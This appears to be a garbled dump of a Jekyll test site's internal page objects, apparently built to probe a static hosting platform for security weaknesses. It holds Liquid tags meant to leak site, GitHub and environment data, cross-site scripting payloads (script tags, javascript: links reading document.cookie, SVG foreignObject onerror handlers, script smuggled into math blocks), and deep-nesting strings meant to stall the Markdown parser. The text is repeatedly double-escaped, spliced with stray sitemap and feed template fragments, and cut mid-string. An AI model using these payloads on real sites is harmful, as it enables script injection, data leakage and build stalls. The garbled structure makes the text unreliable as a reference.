&amp;quot;directory&amp;quot;: &amp;quot;/home/loca/testgit/_posts&amp;quot;,\n &amp;quot;relative_directory&amp;quot;: &amp;quot;_posts&amp;quot;,\n &amp;quot;docs&amp;quot;: [],\n }\n],\n&amp;quot;html_pages&amp;quot;: [\n &amp;quot;\n&amp;quot;,\n &amp;quot;## 1. Information Disclosure / Context Leak Tests\n\nCheck if the following tags render raw system strings, tokens, or environment details when viewed on the live platform:\n\n* Global Site Objects: </code>{{ site | inspect }}<code class=\"language-plaintext highlighter-rouge\">\n* GitHub Metadata Dump: </code>{{ site.github | json }}<code class=\"language-plaintext highlighter-rouge\">\n* Environment Verification: </code>{{ site.env | inspect }}<code class=\"language-plaintext highlighter-rouge\">\n* Pages Collection Metadata: </code>{{ site.pages | inspect }}<code class=\"language-plaintext highlighter-rouge\">\n\n—\n\n## 2. Cross-Site Scripting (XSS) / Filter Bypasses\n\n### Standard Script Tags\n&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;\n\n### URI Handler Scheme\nExecute Test Payload\n\n&amp;lt;a href=\&amp;quot;javascript:alert(1)\&amp;quot;&amp;gt;Raw Anchor Link Test&amp;lt;/a&amp;gt;\n\n—\n\n## 3. Namespace Confusion via SVG </code>foreignObject<code class=\"language-plaintext highlighter-rouge\">\n\nThis test checks if the Markdown sanitizer scans inside embedded XML schemas. If successful, the image tag inside the XHTML body wrapper will execute.\n\n&amp;lt;svg width=\&amp;quot;200\&amp;quot; height=\&amp;quot;100\&amp;quot;&amp;gt;\n &amp;lt;foreignObject width=\&amp;quot;200\&amp;quot; height=\&amp;quot;100\&amp;quot;&amp;gt;\n &amp;lt;body xmlns=\&amp;quot;http://www.w3.org/1999/xhtml\&amp;quot;&amp;gt;\n &amp;lt;img src=\&amp;quot;does-not-exist.jpg\&amp;quot; onerror=\&amp;quot;alert(&amp;apos;XSS-via-foreignObject&amp;apos;)\&amp;quot;&amp;gt;\n &amp;lt;/body&amp;gt;\n &amp;lt;/foreignObject&amp;gt;\n&amp;lt;/svg&amp;gt;\n\n—\n\n## 4. Deep Parser Stress Tests (ReDoS / Pipeline Timeout)\n\nThese strings test if the platform&amp;apos;s backend implementation of Kramdown handles deeply recursive nesting safely or if it stalls the build process.\n\n&amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; &amp;gt; Deep Blockquote Nesting\n\n[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[Deep Bracket Nesting]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]\n&amp;quot;,\n &amp;quot;DUMP_START\n{{ site | inspect }}\n{{ site.github | json }}\n{{ ENV | inspect }}\nDUMP_END\n&amp;quot;,\n &amp;quot;&amp;quot;,\n &amp;quot;&amp;lt;svg width=\&amp;quot;500\&amp;quot; height=\&amp;quot;500\&amp;quot; xmlns=\&amp;quot;http://www.w3.org/2000/svg\&amp;quot;&amp;gt;\n &amp;lt;foreignObject width=\&amp;quot;100%\&amp;quot; height=\&amp;quot;100%\&amp;quot;&amp;gt;\n &amp;lt;div xmlns=\&amp;quot;http://www.w3.org/1999/xhtml\&amp;quot;&amp;gt;\n &amp;lt;img src=\&amp;quot;x\&amp;quot; onerror=\&amp;quot;alert(&amp;apos;Local-Test&amp;apos;)\&amp;quot;&amp;gt;\n &amp;lt;/div&amp;gt;\n &amp;lt;/foreignObject&amp;gt;\n&amp;lt;/svg&amp;gt;\n&amp;quot;,\n &amp;quot;## Math Parsing Behavior\n\(\\\\alpha + \\\\beta = \\\\chi &amp;amp;lt;script&amp;amp;gt;alert(1)&amp;amp;lt;/script&amp;amp;gt;\)\n\n## Link Schema Behavior\nStandard Verification Link\n\n\(\\\\alpha + \\\\beta = \\\\chi &amp;amp;lt;script&amp;amp;gt;alert(document.domain)&amp;amp;lt;/script&amp;amp;gt;\)\n\n\(\\\\underline{\\\\text{&amp;amp;lt;img src=x onerror=alert(1)&amp;amp;gt;}}\)\n\n\(\\\\msghash = \\\\text{\\&amp;amp;quot;hello\\&amp;amp;quot; \\\\color{red}{\\\\cancel{\\\\text{XSS Payload}}}}\)\n&amp;quot;,\n &amp;quot;Click for Content Verification\n\nBypass Variant 2\n\nBypass Variant 3\n&amp;quot;,\n &amp;quot;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt;&amp;gt; Deep Nesting Stalling Test\n\n[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaax]\n\n[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[STALL]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]\n&amp;quot;\n],\n&amp;quot;pages&amp;quot;: [\n &amp;quot;\n&amp;quot;,\n &amp;quot;## 1. Cross-Site Scripting (XSS) / Filter Bypasses\n\n### Standard Script Tags\n&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;\n\n### URI Handler Scheme\nExecute Test Payload\n\n&amp;lt;a href=\&amp;quot;javascript:alert(1)\&amp;quot;&amp;gt;Raw Anchor Link Test&amp;lt;/a&amp;gt;\n\n—\n\n## 3. &amp;quot;&amp;lt;?xml version=\&amp;quot;1.0\&amp;quot; encoding=\&amp;quot;UTF-8\&amp;quot;?&amp;gt;\n{% if page.xsl %}&amp;lt;?xml-stylesheet type=\&amp;quot;text/xsl\&amp;quot; href=\&amp;quot;{{ \&amp;quot;/sitemap.xsl\&amp;quot; | absolute_url }}\&amp;quot;?&amp;gt;\n{% endif %}&amp;lt;urlset xmlns:xsi=\&amp;quot;http://www.w3.org/2001/XMLSchema-instance\&amp;quot; xsi:schemaLocation=\&amp;quot;http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\&amp;quot; xmlns=\&amp;quot;http://www.sitemaps.org/schemas/sitemap/0.9\&amp;quot;&amp;gt;\n{% assign collections = site.collections | where_exp:&amp;apos;collection&amp;apos;,&amp;apos;collection.output != false&amp;apos; %}{% for collection in collections %}{% assign docs = collection.docs | where_exp:&amp;apos;doc&amp;apos;,&amp;apos;doc.sitemap != false&amp;apos; %}{% for doc in docs %}&amp;lt;url&amp;gt;\n&amp;lt;loc&amp;gt;{{ doc.url | replace:&amp;apos;/index.html&amp;apos;,&amp;apos;/&amp;apos; | absolute_url | xml_escape }}&amp;lt;/loc&amp;gt;\n{% if doc.last_modified_at or doc.date %}&amp;lt;lastmod&amp;gt;{{ doc.last_modified_at | default: doc.date | date_to_xmlschema }}&amp;lt;/lastmod&amp;gt;\n{% endif %}&amp;lt;/url&amp;gt;\n{% endfor %}{% endfor %}{% assign pages = site.html_pages | where_exp:&amp;apos;doc&amp;apos;,&amp;apos;doc.sitemap != false&amp;apos; | where_exp:&amp;apos;doc&amp;apos;,&amp;apos;doc.url != \&amp;quot;/404.html\&amp;quot;&amp;apos; %}{% for page in pages %}&amp;lt;url&amp;gt;\n&amp;lt;loc&amp;gt;{{ page.url | replace:&amp;apos;/index.html&amp;apos;,&amp;apos;/&amp;apos; | absolute_url | xml_escape }}&amp;lt;/loc&amp;gt;\n{% if page.last_modified_at %}&amp;lt;lastmod&amp;gt;{{ page.last_modified_at | date_to_xmlschema }}&amp;lt;/lastmod&amp;gt;\n{% endif %}&amp;lt;/url&amp;gt;\n{% endfor %}{% assign static_files = page.static_files | where_exp:&amp;apos;page&amp;apos;,&amp;apos;page.sitemap != false&amp;apos; | where_exp:&amp;apos;page&amp;apos;,&amp;apos;page.name != \&amp;quot;404.html\&amp;quot;&amp;apos; %}{% for file in static_files %}&amp;lt;url&amp;gt;\n&amp;lt;loc&amp;gt;{{ file.path | replace:&amp;apos;/index.html&amp;apos;,&amp;apos;/&amp;apos; | absolute_url | xml_escape }}&amp;lt;/loc&amp;gt;\n&amp;lt;lastmod&amp;gt;{{ file.modified_time | date_to_xmlschema }}&amp;lt;/lastmod&amp;gt;\n&amp;lt;/url&amp;gt;\n{% endfor %}&amp;lt;/urlset&amp;gt;\n&amp;quot;,\n &amp;quot;Sitemap: {{ \&amp;quot;sitemap.xml\&amp;quot; | absolute_url }}\n&amp;quot;,\n &amp;quot;&amp;lt;?xml version=\&amp;quot;1.0\&amp;quot; encoding=\&amp;quot;utf-8\&amp;quot;?&amp;gt;{% if page.xsl %}&amp;lt;?xml-stylesheet type=\&amp;quot;text/xml\&amp;quot; href=\&amp;quot;{{ &amp;apos;/feed.xslt.xml&amp;apos; | absolute_url }}\&amp;quot;?&amp;gt;{% endif %}&amp;lt;feed xmlns=\&amp;quot;http://www.w3.org/2005/Atom\&amp;quot; {% if site.lang %}xml:lang=\&amp;quot;{{ site.lang }}\&amp;quot;{% endif %}&amp;gt;&amp;lt;generator uri=\&amp;quot;https://jekyllrb.com/\&amp;quot; version=\&amp;quot;{{ jekyll.version }}\&amp;quot;&amp;gt;Jekyll&amp;lt;/generator&amp;gt;&amp;lt;link href=\&amp;quot;{{ page.url | absolute_url }}\&amp;quot; rel=\&amp;quot;self\&amp;quot; type=\&amp;quot;application/atom+xml\&amp;quot; /&amp;gt;&amp;lt;link href=\&amp;quot;{{ &amp;apos;/&amp;apos; | absolute_url }}\&amp;quot; rel=\&amp;quot;alternate\&amp;quot; type=\&amp;quot;text/html\&amp;quot; {% if site.lang %}hreflang=\&amp;quot;{{ site.lang }}\&amp;quot; {% endif %}/&amp;gt;&amp;lt;updated&amp;gt;{{ site.time | date_to_xmlschema }}&amp;lt;/updated&amp;gt;&amp;lt;id&amp;gt;{{ page.url | absolute_url | xml_escape }}&amp;lt;/id&amp;gt;{% assign title = site.title | default: site.name %}{% if page.collection != \&amp;quot;posts\&amp;quot; %}{% assign collection = page.collection | capitalize %}{% assign title = title | append: \&amp;quot; | \&amp;quot; | append: collection %}{% endif %}{% if page.category %}{% assign category = page.category | capitalize %}{% assign title = title | append: \&amp;quot; | \&amp;quot; | append: category %}{% endif %}{% if title %}&amp;lt;title type=\&amp;quot;html\&amp;quot;&amp;gt;{{ title | smartify | xml_escape }}&amp;lt;/title&amp;gt;{% endif %}{% if site.description %}&amp;lt;subtitle&amp;gt;{{ site.description | xml_escape }}&amp;lt;/subtitle&amp;gt;{% endif %}{% if site.author %}&amp;lt;author&amp;gt;&amp;lt;name&amp;gt;{{ site.author.name | default: site.author | xml_escape }}&amp;lt;/name&amp;gt;{% if site.author.email %}&amp;lt;email&amp;gt;{{ site.author.email | xml_escape }}&amp;lt;/email&amp;gt;{% endif %}{% if site.author.uri %}&amp;lt;uri&amp;gt;{{ site.author.uri | xml_escape }}&amp;lt;/uri&amp;gt;{% endif %}&amp;lt;/author&amp;gt;{% endif %}{% if page.tags %}{% assign posts = site.tags[page.tags] %}{% else %}{% assign posts = site[page.collection] %}{% endif %}{% if page.category %}{% assign posts = posts | where: \&amp;quot;categories\&amp;quot;, page.category %}{% endif %}{% unless site.show_drafts %}{% assign posts = posts | where_exp: \&amp;quot;post\&amp;quot;, \&amp;quot;post.draft != true\&amp;quot; %}{% endunless %}{% assign posts = posts | sort: \&amp;quot;date\&amp;quot; | reverse %}{% assign posts_limit = site.feed.posts_limit | default: 10 %}{% for post in posts limit: posts_limit %}&amp;lt;entry{% if post.lang %}{{\&amp;quot; \&amp;quot;}}xml:lang=\&amp;quot;{{ post.lang }}\&amp;quot;{% endif %}&amp;gt;{% assign post_title = post.title | smartify | strip_html | normalize_whitespace | xml_escape %}&amp;lt;title type=\&amp;quot;html\&amp;quot;&amp;gt;{{ post_title }}&amp;lt;/title&amp;gt;&amp;lt;link href=\&amp;quot;{{ post.url | absolute_url }}\&amp;quot; rel=\&amp;quot;alternate\&amp;quot; type=\&amp;quot;text/html\&amp;quot; title=\&amp;quot;{{ post_title }}\&amp;quot; /&amp;gt;&amp;lt;published&amp;gt;{{ post.date | date_to_xmlschema }}&amp;lt;/published&amp;gt;&amp;lt;updated&amp;gt;{{ post.last_modified_at | default: post.date | date_to_xmlschema \"https://github.com/LocaMartin/testgit/zipball/gh-pages\"\n}</code></li>\n <li><strong>Environment Verification:</strong> <code class=\"language-plaintext highlighter-rouge\">nil</code></li>\n <li><strong>Pages Collection Metadata:</strong> <code class=\"language-plaintext highlighter-rouge\">[#&amp;lt;Jekyll::Page @name=&amp;quot;frontmtcon.md&amp;quot;&amp;gt;, #&amp;lt;Jekyll::Page @name=&amp;quot;index.md&amp;quot;&amp;gt;, #&amp;lt;Jekyll::Page @name=&amp;quot;multitenant.md&amp;quot;&amp;gt;, #&amp;lt;Jekyll::Page @name=&amp;quot;mutrtssrf.md&amp;quot;&amp;gt;, #&amp;lt;Jekyll::Page @name=&amp;quot;svgtest.md&amp;quot;&amp;gt;, #&amp;lt;Jekyll::Page @name=&amp;quot;vectors.md&amp;quot;&amp;gt;, #&amp;lt;Jekyll::Page @name=&amp;quot;conisoluri.md&amp;quot;&amp;gt;, #&amp;lt;Jekyll::Page @name=&amp;quot;redos.md&amp;quot;&amp;gt;, #&amp;lt;Jekyll:PageWithoutAFile @name=&amp;quot;sitemap.xml&amp;quot;&amp;gt;, #&amp;lt;Jekyll:PageWithoutAFile @name=&amp;quot;robots.txt&amp;quot;&amp;gt;, #&amp;lt;Jekyll::Page @name=&amp;quot;/feed.xml&amp;quot;&amp;gt;]</code></li>\n</ul>\n\n<hr />\n\n<h2 id=\"2-cross-site-scripting-xss–filter-bypasses\">2. Cross-Site Scripting (XSS) / Filter Bypasses</h2>\n\n<h3 id=\"standard-script-tags\">Standard Script Tags</h3>\n<script>alert(document.domain)</script>\n\n<h3 id=\"uri-handler-scheme\">URI Handler Scheme</h3>\n<p><a href=\"javascript:alert(document.cookie)\">Execute Test Payload</a></p>\n\n<p><a href=\"javascript:alert(1)\">Raw Anchor Link Test</a></p>\n\n<hr />\n\n<h2 id=\"3-namespace-confusion-via-svg-foreignobject\">3. Namespace Confusion via SVG <code class=\"language-plaintext highlighter-rouge\">foreignObject</code></h2>\n\n<p>This test checks if the Markdown sanitizer scans inside embedded XML schemas. If successful, the image tag inside the XHTML body wrapper will execute.</p>\n\n<svg width=\"200\" height=\"100\">\n <foreignObject width=\"200\" height=\"100\">\n <body xmlns=\"http://www.w3.org/1999/xhtml\">\n <img src=\"does-not-exist.jpg\" onerror=\"alert('XSS-via-foreignObject')\" />\n </body>\n </foreignObject>\n</svg>\n\n<hr />\n\n<h2 id=\"4-deep-parser-stress-tests-redos–pipeline-timeout\">4. Deep Parser Stress Tests (ReDoS / Pipeline Timeout)</h2>\n\n<p>These strings test if the platform’s backend implementation of Kramdown handles deeply recursive nesting safely or if it stalls the build process.</p>\n\n<blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <p>Deep Blockquote Nesting</p>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n</blockquote>\n\n<p>[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[Deep Bracket Nesting]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]</p>\n", "DUMP_START\n{{ site | inspect }}\n{{ site.github | json }}\n{{ ENV | inspect }}\nDUMP_END\n", "", "<svg width=\"500\" height=\"500\" xmlns=\"http://www.w3.org/2000/svg\">\n <foreignObject width=\"100%\" height=\"100%\">\n <div xmlns=\"http://www.w3.org/1999/xhtml\">\n <img src=\"x\" onerror=\"alert('Local-Test')\">\n </div>\n </foreignObject>\n</svg>\n", "## Math Parsing Behavior\n\(\\alpha + \\beta = \\chi &lt;script&gt;alert(1)&lt;/script&gt;\)\n\n## Link Schema Behavior\nStandard Verification Link\n\n\(\\alpha + \\beta = \\chi &lt;script&gt;alert(document.domain)&lt;/script&gt;\)\n\n\(\\underline{\\text{&lt;img src=x onerror=alert(1)&gt;}}\)\n\n\(\\msghash = \\text{\&quot;hello\&quot; \\color{red}{\\cancel{\\text{XSS Payload}}}}\)\n", "Click for Content Verification\n\nBypass Variant 2\n\nBypass Variant 3\n", ">>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>>> Deep Nesting Stalling Test\n\n[aaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaaax]\n\n[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[STALL]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]\n" ], "pages": [ "\n", "<h2 id=\"1-information-disclosure–context-leak-tests\">1. Information Disclosure / Context Leak Tests</h2>\n\n<p>Check if the following tags render raw system strings, tokens, or environment details when viewed on the live platform:</p>\n\n<ul>\n <li><strong>Global Site Objects:</strong> <code class=\"language-plaintext highlighter-rouge\">{\n&amp;quot;tags&amp;quot;: {},\n&amp;quot;config&amp;quot;: null,\n&amp;quot;data&amp;quot;: Information Disclosure / Context Leak Tests\n\nCheck if the following tags render raw system strings, tokens, or environment details when viewed on the live platform:\n\n* Global Site Objects: </code>{{ site | inspect }}<code class=\"language-plaintext highlighter-rouge\">\n* GitHub Metadata Dump: </code>{{ site.github | json }}<code class=\"language-plaintext highlighter-rouge\">\n* Environment Verification: </code>{{ site.env | inspect }}<code class=\"language-plaintext highlighter-rouge\">\n* Pages Collection Metadata: </code>{{ site.pages | inspect }}<code class=\"language-plaintext highlighter-rouge\">\n\n—\n\n## 2. Cross-Site Scripting (XSS) / Filter Bypasses\n\n### Standard Script Tags\n&amp;lt;script&amp;gt;alert(document.domain)&amp;lt;/script&amp;gt;\n\n### URI Handler Scheme\nExecute Test Payload\n\n&amp;lt;a href=\&amp;quot;javascript:alert(1)\&amp;quot;&amp;gt;Raw Anchor Link Test&amp;lt;/a&amp;gt;\n\n—\n\n## 3. xmlns=\&amp;quot;http://www.sitemaps.org/schemas/sitemap/0.9\&amp;quot;&amp;gt;\n{% assign collections = site.collections | where_exp:&amp;apos;collection&amp;apos;,&amp;apos;collection.output != false&amp;apos; %}{% for collection in collections %}{% assign docs = collection.docs | where_exp:&amp;apos;doc&amp;apos;,&amp;apos;doc.sitemap != false&amp;apos; %}{% for doc in docs %}&amp;lt;url&amp;gt;\n&amp;lt;loc&amp;gt;{{ doc.url | replace:&amp;apos;/index.html&amp;apos;,&amp;apos;/&amp;apos; | absolute_url | xml_escape }}&amp;lt;/loc&amp;gt;\n{% if doc.last_modified_at or doc.date %}&amp;lt;lastmod&amp;gt;{{ doc.last_modified_at | default: doc.date | date_to_xmlschema }}&amp;lt;/lastmod&amp;gt;\n{% endif %}&amp;lt;/url&amp;gt;\n{% endfor %}{% endfor %}{% assign pages = site.html_pages | where_exp:&amp;apos;doc&amp;apos;,&amp;apos;doc.sitemap != false&amp;apos; | where_exp:&amp;apos;doc&amp;apos;,&amp;apos;doc.url != \&amp;quot;/404.html\&amp;quot;&amp;apos; %}{% for page in pages %}&amp;lt;url&amp;gt;\n&amp;lt;loc&amp;gt;{{ page.url | replace:&amp;apos;/index.html&amp;apos;,&amp;apos;/&amp;apos; | absolute_url | xml_escape }}&amp;lt;/loc&amp;gt;\n{% if date_to_xmlschema }}&amp;lt;/updated&amp;gt;&amp;lt;id&amp;gt;{{ page.url | absolute_url | xml_escape }}&amp;lt;/id&amp;gt;{% assign title = site.title | default: site.name %}{% if page.collection != \&amp;quot;posts\&amp;quot; %}{% assign collection = page.collection | capitalize %}{% assign title = title | append: \&amp;quot; | \&amp;quot; | append: collection %}{% endif %}{% if page.category %}{% assign category = page.category | capitalize %}{% assign title = title | append: \&amp;quot; | \&amp;quot; | append: category %}{% endif %}{% if title %}&amp;lt;title type=\&amp;quot;html\&amp;quot;&amp;gt;{{ title | smartify | xml_escape }}&amp;lt;/title&amp;gt;{% endif %}{% if site.description %}&amp;lt;subtitle&amp;gt;{{ site.description | xml_escape page.category %}{% assign posts = posts | where: \&amp;quot;categories\&amp;quot;, page.category %}{% endif %}{% unless site.show_drafts %}{% assign posts = posts | where_exp: \&amp;quot;post\&amp;quot;, \&amp;quot;post.draft != true\&amp;quot; %}{% endunless %}{% assign posts = posts | sort: \&amp;quot;date\&amp;quot; | reverse %}{% assign posts_limit = site.feed.posts_limit | default: 10 %}{% for post in posts limit: posts_limit %}&amp;lt;entry{% if post.lang %}{{\&amp;quot; \&amp;quot;}}xml:lang=\&amp;quot;{{ post.lang }}\&amp;quot;{% endif id=\"2-cross-site-scripting-xss–filter-bypasses\">2. Cross-Site Scripting (XSS) / Filter Bypasses</h2>\n\n<h3 id=\"standard-script-tags\">Standard Script Tags</h3>\n<script>alert(document.domain)</script>\n\n<h3 id=\"uri-handler-scheme\">URI Handler Scheme</h3>\n<p><a href=\"javascript:alert(document.cookie)\">Execute Test Payload</a></p>\n\n<p><a href=\"javascript:alert(1)\">Raw Anchor Link Test</a></p>\n\n<hr />\n\n<h2 id=\"3-namespace-confusion-via-svg-foreignobject\">3. Namespace Confusion via SVG <code class=\"language-plaintext highlighter-rouge\">foreignObject</code></h2>\n\n<p>This test checks if the Markdown sanitizer scans inside embedded XML schemas. If successful, the image tag inside the XHTML body wrapper will execute.</p>\n\n<svg width=\"200\" height=\"100\">\n <foreignObject width=\"200\" height=\"100\">\n <body xmlns=\"http://www.w3.org/1999/xhtml\">\n <img src=\"does-not-exist.jpg\" onerror=\"alert('XSS-via-foreignObject')\" />\n </body>\n </foreignObject>\n</svg>\n\n<hr />\n\n<h2 id=\"4-deep-parser-stress-tests-redos–pipeline-timeout\">4. Deep Parser Stress Tests (ReDoS / Pipeline Timeout)</h2>\n\n<p>These strings test if the platform’s backend implementation of Kramdown handles deeply recursive nesting safely or if it stalls the build process.</p>\n\n<blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <blockquote>\n <p>Deep Blockquote Nesting</p>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n </blockquote>\n</blockquote>\n\n<p>[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[[Deep Bracket Nesting]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]]</p>\n", width=\"100%\" height=\"100%\">\n <div xmlns=\"http://www.w3.org/1999/xhtml\">\n <img src=\"x\" onerror=\"alert('Local-Test')\">\n </div>\n </foreignObject>\n</svg>\n", "## Math Parsing Behavior\n\(\\alpha + \\beta = \\chi &lt;script&gt;alert(1)&lt;/script&gt;\)\n\n## Link Schema Behavior\nStandard Verification Link\n\n\(\\alpha + \\beta = \\chi &lt;script&gt;alert(document.domain)&lt;/script&gt;\)\n\n\(\\underline{\\text{&lt;img src=x onerror=alert(1)&gt;}}\)\n\n\(\\msghash = \\text{\&quot;hello\&quot; \\color{red}{\\cancel{\\text{XSS "<?xml version=\"1.0\" encoding=\"UTF-8\"?>\n{% if page.xsl %}<?xml-stylesheet type=\"text/xsl\" href=\"{{ \"/sitemap.xsl\" | absolute_url }}\"?>\n{% endif %}<urlset xmlns:xsi=\"http://www.w3.org/2001/XMLSchema-instance\" xsi:schemaLocation=\"http://www.sitemaps.org/schemas/sitemap/0.9 http://www.sitemaps.org/schemas/sitemap/0.9/sitemap.xsd\" xmlns=\"http://www.sitemaps.org/schemas/sitemap/0.9\">\n{% assign collections = site.collections | where_exp:'collection','collection.output != false' %}{% for collection in collections %}{% assign docs = collection.docs | where_exp:'doc','doc.sitemap != false' %}{% for doc in docs %}<url>\n<loc>{{ doc.url | replace:'/index.html','/' | absolute_url | xml_escape }}</loc>\n{% if doc.last_modified_at or doc.date %}<lastmod>{{ doc.last_modified_at | default: doc.date | date_to_xmlschema }}</lastmod>\n{% endif %}</url>\n{% endfor %}{% endfor %}{% assign pages = site.html_pages | where_exp:'doc','doc.sitemap != false' | where_exp:'doc','doc.url != \"/404.html\"' %}{% for page in pages %}<url>\n<loc>{{ page.url | replace:'/index.html','/' | absolute_url | xml_escape }}</loc>\n{% if page.last_modified_at %}<lastmod>{{ page.last_modified_at | date_to_xmlschema }}</lastmod>\n{% endif %}</url>\n{% endfor %}{% assign static_files = page.static_files | where_exp:'page','page.sitemap != false' | where_exp:'page','page.name != \"404.html\"' %}{% for file in static_files %}<url>\n<loc>{{ file.path | replace:'/index.html','/' | absolute_url | xml_escape }}</loc>\n<lastmod>{{ file.modified_time | date_to_xmlschema }}</lastmod>\n</url>\n{% endfor %}</urlset>\n", "Sitemap: {{ \"sitemap.xml\" | absolute_url }}\n", "<?xml version=\"1.0\" encoding=\"utf-8\"?>{% if page.xsl %}<?xml-stylesheet type=\"text/xml\" href=\"{{ '/feed.xslt.xml' | absolute_url }}\"?>{% endif %}<feed xmlns=\"http://www.w3.org/2005/Atom\" {% if site.lang %}xml:lang=\"{{ site.lang }}\"{% endif %}><generator uri=\"https://jekyllrb.com/\" version=\"{{ jekyll.version }}\">Jekyll</generator><link href=\"{{ page.url | absolute_url }}\" rel=\"self\" type=\"application/atom+xml\" /><link href=\"{{ '/' | absolute_url }}\" rel=\"alternate\" type=\"text/html\" {% if site.lang %}hreflang=\"{{ site.lang }}\" {% endif %}/><updated>{{ site.time | date_to_xmlschema }}</updated><id>{{ page.url | absolute_url | xml_escape }}</id>{% assign title = site.title | default: site.name %}{% if page.collection != \"posts\" %}{% assign collection = page.collection | capitalize %}{% assign title = title | append: \" | \" | append: collection %}{% endif %}{% if page.category %}{% assign category = page.category | capitalize %}{% assign title = title | append: \" | \" | append: category %}{% endif %}{% if title %}<title type=\"html\">{{ title | smartify | xml_escape }}</title>{% endif %}{% if site.description %}<subtitle>{{ site.description | xml_escape }}</subtitle>{% endif %}{% if site.author %}<author><name>{{ site.author.name | default: site.author | xml_escape }}</name>{% if site.author.email %}<email>{{ site.author.email | xml_escape }}</email>{% endif %}{% if site.author.uri %}<uri>{{ site.author.uri | xml_escape }}</uri>{% endif %}</author>{% endif %}{% if page.tags %}{% assign posts = site.tags[page.tags] %}{% else %}{% assign posts = site[page.collection] %}{% endif %}{% if page.category %}{% assign posts = posts | where: \"categories\", page.category %}{% endif %}{% unless site.show_drafts %}{% assign posts = posts | where_exp: \"post\", \"post.draft != true\" %}{% endunless %}{% assign posts = posts | sort: \"date\" | reverse %}{% assign posts_limit = site.feed.posts_limit | default: 10 %}{% for post in posts limit: posts_limit %}<entry{% if 